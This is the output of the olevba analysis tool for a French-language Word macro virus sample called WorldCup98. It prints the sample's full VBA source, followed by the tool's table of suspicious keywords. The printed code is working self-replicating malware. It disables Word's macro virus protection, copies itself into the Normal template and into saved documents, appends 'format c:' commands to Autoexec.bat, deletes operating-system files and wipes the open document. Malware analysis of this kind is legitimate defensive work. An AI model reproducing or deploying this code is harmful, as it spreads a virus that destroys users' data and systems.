olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WorldCup98.bas 
in file: Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26 - OLE stream: 'Macros/VBA/WorldCup98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyTime, MyDate, NBH$
MyTime = Time
MyDate = Date
D$ = Mid(MyDate, 1, 2)
Ts$ = Mid(MyTime, 7, 8)
If D$ = "12" Or Ts$ = "12" Then
    Randomize
    NBH$ = Int(Rnd * 10) + 1
    Select Case NBH$
        Case 1, 3, 5, 7, 9
            Call Pronostique
        Case 2, 4, 6, 8, 10
            Call WC98PayLoad
    End Select
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "WorldCup98" Then
        WorldCup98Installed = -1
    End If
Next i
If Not WorldCup98Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="WorldCup98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Pronostic", Object:=wdOrganizerObjectProjectItems
    MsgBox "VIVE LA COUPE DU MONDE 98!!!!", vbInformation, "Virus WorldCup98"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="WorldCup98", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Pronostic", Object:=wdOrganizerObjectProjectItems
MsgBox "J'espère que tu aime le football...", vbInformation, "Virus WorldCup98"
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Hip Hip Hourra!!!!", vbInformation, "Virus WorldCup98"
ErrorFT:
End Sub
Private Sub Pronostique()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPe
Dim WC98$, NH$, Equipe$, Pay$
Randomize
Debut:
    Pronostic.Show
WC98$ = WordBasic.[GetPrivateProfileString$]("Pronostic", "Equipe", "WorldCup98.INI")
If WC98$ = "0" Then
    MsgBox "Veuillez choisir une équipe", vbInformation, "Virus WorldCup98"
    GoTo Debut
End If
NH$ = Int(Rnd * 9) + 1
If NH$ = "1" Then
    Equipe$ = "Brésil"
End If
If NH$ = "2" Then
    Equipe$ = "Italie"
End If
If NH$ = "3" Then
    Equipe$ = "France"
End If
If NH$ = "4" Then
    Equipe$ = "Espagne"
End If
If NH$ = "5" Then
    Equipe$ = "Mexique"
End If
If NH$ = "6" Then
    Equipe$ = "Allemagne"
End If
If NH$ = "7" Then
    Equipe$ = "Angleterre"
End If
If NH$ = "8" Then
    Equipe$ = "Argentine"
End If
If NH$ = "9" Then
    Equipe$ = "Yougoslavie"
End If
If NH$ = WC98$ Then
    MsgBox "Bravo!!!, bien joué...", Title:="Virus WorldCup98"
Message:
    StatusBar = "       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                   Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
GoTo Message
End If
If NH$ <> WC98$ Then
        MsgBox "Dommage pour toi, tu as PERDU..." & Chr$(13) & "mon choix était: " & Equipe$, Title:="Virus WorldCup98"
        Randomize
        Pay$ = Int(Rnd * 15) + 1
        Select Case Pay$
            Case 1, 5, 8, 9, 12, 13
                Open "C:\Autoexec.bat" For Append As #1
                    Print #1, "Cls"
                    Print #1, "Echo La coupe du monde 98 c'est génial!!!!"
                    Print #1, "Echo y|Format c: /u /v:WorldCup98"
                    Print #1, "Echo o|Format c: /u /v:WorldCup98"
                Close #1
            Case 3, 4, 7, 15
                Kill "C:\Dos\*.*"
                Kill "C:\Windows\Command\*.*"
                Kill "C:\Msdos.sys"
                Kill "C:\Io.sys"
            Case 2, 6, 10, 11, 14
                Selection.WholeStory
                Selection.Delete Unit:=wdCharacter, Count:=1
                For i = 1 To 98
                Selection.TypeParagraph
                Selection.TypeText Text:="Vive la coupe du monde 98!!!!!"
                Next i
                Selection.TypeParagraph
                Selection.TypeText Text:="ZeMacroKiller98 aime beaucoup le football..."
                ActiveDocument.PrintOut
        End Select
End If
ErrorPe:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "ZeMacroKiller98 est heureux de dédier ce virus" & Chr$(13) & "à tous ceux qui aime le FOOTBALL", vbInformation, "Virus WorldCup98"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "Virus WorldCup98"
    .Text = "Allez la France!!!!!"
    .Show
End With
ErrorVVBC:
End Sub
Private Sub WC98PayLoad()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorWC98PL
Charge:
    ActiveDocument.Shapes.AddTextEffect(msoTextEffect22, "World Cup 98", _
        "Impact", 60#, msoFalse, msoFalse, 132.15, 120.55).Select
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 45#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 90#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 135#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 180#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 225#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 270#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 315#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 0#
    Selection.ShapeRange.Delete
GoTo Charge
ErrorWC98PL:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Pronostic.frm 
in file: Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26 - OLE stream: 'Macros/VBA/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Unload Pronostic
End Sub

Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
WordBasic.SetPrivateProfileString "Pronostic", "Equipe", "0", "WorldCup98.INI"
End Sub
Private Sub OptionButton1_Click()
WordBasic.SetPrivateProfileString "Pronostic", "Equipe", "1", "WorldCup98.INI"
End Sub
Private Sub OptionButton2_Click()
WordBasic.SetPrivateProfileString "Pronostic", "Equipe", "2", "WorldCup98.INI"
End Sub
Private Sub OptionButton3_Click()
WordBasic.SetPrivateProfileString "Pronostic", "Equipe", "3", "WorldCup98.INI"
End Sub
Private Sub OptionButton4_Click()
WordBasic.SetPrivateProfileString "Pronostic", "Equipe", "4", "WorldCup98.INI"
End Sub
Private Sub OptionButton5_Click()
WordBasic.SetPrivateProfileString "Pronostic", "Equipe", "5", "WorldCup98.INI"
End Sub
Private Sub OptionButton6_Click()
WordBasic.SetPrivateProfileString "Pronostic", "Equipe", "6", "WorldCup98.INI"
End Sub
Private Sub OptionButton7_Click()
WordBasic.SetPrivateProfileString "Pronostic", "Equipe", "7", "WorldCup98.INI"
End Sub
Private Sub OptionButton8_Click()
WordBasic.SetPrivateProfileString "Pronostic", "Equipe", "8", "WorldCup98.INI"
End Sub
Private Sub OptionButton9_Click()
WordBasic.SetPrivateProfileString "Pronostic", "Equipe", "9", "WorldCup98.INI"
End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tu dois choisir une �quipe parmi celle proposer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Si tu gagnes, c'est bien...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Si tu perds, dommage pour toi...�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Voici les �quipes propos�s: �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�L'ordinateur d�cide lui-m�me de son choix
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Il faut que ton choix, soit celui de l'ordinateur
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Br�sil@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Italie@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
France@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Espagne
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mexique
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Allemagne
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Angleterreo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Argentine
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Yougoslavie
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Une fois votre choix fait, cliquez sur Valider
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Valider
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton3'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton4'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton5'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton6'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton7'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton8'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton9'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Zmk.j-82c6b31db78ba63011fadca7b3b4bc0040f65a26' - OLE stream: 'Macros/Pronostic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

